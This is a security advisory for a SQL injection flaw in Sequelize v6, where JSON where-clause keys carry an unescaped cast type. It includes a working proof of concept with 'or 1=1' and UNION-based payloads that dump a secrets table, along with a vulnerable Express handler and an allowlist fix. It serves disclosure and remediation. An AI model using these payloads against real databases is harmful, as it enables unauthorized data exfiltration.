# [H] Sequelize v6 Vulnerable to SQL Injection via JSON Column Cast Type

## Summary
Severity: High
Advisory: GHSA-6457-6jrx-69cr
CVE: CVE-2026-30951
CWE: CWE-89
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N (CVSS_V3)
Published: 2026-03-11
Source: https://github.com/advisories/GHSA-6457-6jrx-69cr
Type: github-advisory

## Affected
- npm: `sequelize` — affected >=6.0.0-beta.1 <6.37.8

## Details
### Summary

SQL injection via unescaped cast type in JSON/JSONB `where` clause processing. The `_traverseJSON()` function splits JSON path keys on `::` to extract a cast type, which is interpolated raw into `CAST(... AS <type>)` SQL. An attacker who controls JSON object keys can inject arbitrary SQL and exfiltrate data from any table.

Affected: v6.x through 6.37.7. v7 (`@sequelize/core`) is not affected.

### Details

In `src/dialects/abstract/query-generator.js`, `_traverseJSON()` extracts a cast type from `::` in JSON keys without validation:

```javascript
// line 1892
_traverseJSON(items, baseKey, prop, item, path) {
    let cast;
    if (path[path.length - 1].includes("::")) {
      const tmp = path[path.length - 1].split("::");
      cast = tmp[1];       // attacker-controlled, no escaping
      path[path.length - 1] = tmp[0];
    }
    // ...
    items.push(this.whereItemQuery(this._castKey(pathKey, item, cast), { [Op.eq]: item }));
}
```

`_castKey()` (line 1925) passes it to `Utils.Cast`, and `handleSequelizeMethod()` (line 1692) interpolates it directly:

```javascript
return `CAST(${result} AS ${smth.type.toUpperCase()})`;
```

JSON path **values** are escaped via `this.escape()` in `jsonPathExtractionQuery()`, but the cast **type** is not.

**Suggested fix** — whitelist known SQL data types:

```javascript
const ALLOWED_CAST_TYPES = new Set([
  'integer', 'text', 'real', 'numeric', 'boolean', 'date',
  'timestamp', 'timestamptz', 'json', 'jsonb', 'float',
  'double precision', 'bigint', 'smallint', 'varchar', 'char',
]);

if (cast && !ALLOWED_CAST_TYPES.has(cast.toLowerCase())) {
  throw new Error(`Invalid cast type: ${cast}`);
}
```

### PoC

`npm install sequelize@6.37.7 sqlite3`

```javascript
const { Sequelize, DataTypes } = require('sequelize');

async function main() {
  const sequelize = new Sequelize('sqlite::memory:', { logging: false });

  const User = sequelize.define('User', {
    username: DataTypes.STRING,
    metadata: DataTypes.JSON,
  });

  const Secret = sequelize.define('Secret', {
    key: DataTypes.STRING,
    value: DataTypes.STRING,
  });

  await sequelize.sync({ force: true });

  await User.bulkCreate([
    { username: 'alice', metadata: { role: 'admin', level: 10 } },
    { username: 'bob',   metadata: { role: 'user',  level: 5 } },
    { username: 'charlie', metadata: { role: 'user', level: 1 } },
  ]);

  await Secret.bulkCreate([
    { key: 'api_key', value: 'sk-secret-12345' },
    { key: 'db_password', value: 'super_secret_password' },
  ]);

  // TEST 1: WHERE clause bypass
  const r1 = await User.findAll({
    where: { metadata: { 'role::text) or 1=1--': 'anything' } },
    logging: (sql) => console.log('SQL:', sql),
  });
  console.log('OR 1=1:', r1.map(u => u.username));
  // Returns ALL rows: ['alice', 'bob', 'charlie']

  // TEST 2: UNION-based cross-table exfiltration
  const r2 = await User.findAll({
    where: {
      metadata: {
        'role::text) and 0 union select id,key,value,null,null from Secrets--': 'x'
      }
    },
    raw: true,
    logging: (sql) => console.log('SQL:', sql),
  });
  console.log('UNION:', r2.map(r => `${r.username}=${r.metadata}`));
  // Returns: api_key=sk-secret-12345, db_password=super_secret_password
}

main().catch(console.error);
```

**Output:**

```
SQL: SELECT `id`, `username`, `metadata`, `createdAt`, `updatedAt`
  FROM `Users` AS `User`
  WHERE CAST(json_extract(`User`.`metadata`,'$.role') AS TEXT) OR 1=1--) = 'anything';
OR 1=1: [ 'alice', 'bob', 'charlie' ]

SQL: SELECT `id`, `username`, `metadata`, `createdAt`, `updatedAt`
  FROM `Users` AS `User`
  WHERE CAST(json_extract(`User`.`metadata`,'$.role') AS TEXT) AND 0
  UNION SELECT ID,KEY,VALUE,NULL,NULL FROM SECRETS--) = 'x';
UNION: [ 'api_key=sk-secret-12345', 'db_password=super_secret_password' ]
```

### Impact

**SQL Injection (CWE-89)** — Any application that passes user-controlled objects as `where` clause values for JSON/JSONB columns is vulnerable. An attacker can exfiltrate data from any table in the database via UNION-based or boolean-blind injection. All dialects with JSON support are affected (SQLite, PostgreSQL, MySQL, MariaDB).

A common vulnerable pattern:

```javascript
app.post('/api/users/search', async (req, res) => {
  const users = await User.findAll({
    where: { metadata: req.body.filter }  // user controls JSON object keys
  });
  res.json(users);
});
```

## References
- https://github.com/sequelize/sequelize/security/advisories/GHSA-6457-6jrx-69cr
- https://nvd.nist.gov/vuln/detail/CVE-2026-30951
- https://github.com/sequelize/sequelize
